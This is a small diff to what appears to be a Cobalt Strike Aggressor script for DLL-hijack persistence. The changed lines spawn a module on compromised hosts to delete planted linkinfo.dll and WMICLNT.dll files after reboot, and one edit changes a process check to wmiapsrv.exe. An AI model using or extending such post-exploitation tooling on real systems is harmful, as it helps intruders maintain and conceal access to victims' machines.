@@ -1105,7 +1105,7 @@ menu "DLL加载"{
 				if( lc(binfo($bid, "process")) eq "explorer.exe"){
 					blog($bid , "The file will be delete after restart.");
 					$Data = "2 C:\\windows\\linkinfo.dll 1";
-					bdllspawn!($bid, getFileProper(script_resource("Persistence/modules/"),$dll ),$Data, "Del linkinfo.dll after reboot.", 5000);
+					bdllspawn!($bid, getFileProper(script_resource("Persistence/modules/"), $dll ),$Data, "Del linkinfo.dll after reboot.", 5000);
 				}else{
 					blog($bid,"Try to delete $TempFile (If the dll loaded , delete will be return failed.)");
 					$Data = "0 C:\\windows\\linkinfo.dll 1";
@@ -1158,7 +1158,7 @@ menu "DLL加载"{
 					return;
 				}
 				
-				if( lc(binfo($bid, "process")) eq "explorer.exe"){
+				if( lc(binfo($bid, "process")) eq "wmiapsrv.exe"){
 					blog($bid , "The file will be delete after restart.");
 					$Data = "2 $TempFile 1";
 					bdllspawn!($bid, getFileProper(script_resource("Persistence/modules/"),$dll ),$Data, "Del WMICLNT.dll after reboot.", 5000);
